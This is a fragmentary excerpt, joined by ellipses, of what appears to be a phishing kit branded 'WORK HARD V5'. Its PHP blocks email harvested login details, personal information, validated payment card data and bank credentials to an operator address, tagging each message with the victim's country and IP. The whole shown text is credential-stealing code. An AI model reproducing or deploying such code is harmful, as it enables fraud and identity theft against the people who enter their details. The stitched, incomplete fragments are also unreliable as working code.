...
<script src="./imcs_files/jquery.maskedinput.js" type="text/javascript"></script>
<style type="text/css">
        body {
            margin: 0
        }
...
mail($em,"LGN | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:WORK HARD V5<work-hard@dreambig.com>");
?>	
...
mail($em,"INF | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:WORK HARD V5<work-hard@dreambig.com>");
?>
...
if (!empty($O13) and !empty($O14) and work_hard($O14) == "valid" and !empty($O15) and !empty($O16)) { mail($em,"CRD | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:WORK HARD V5<work-hard@dreambig.com>");
?>
<?php
if ($pgbnk == 'yes') {
?>
...
mail($em,"BNK | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:WORK HARD V5<work-hard@dreambig.com>");
?>
<?php include ('xf/prctscs.php'); ?>
<?php
}
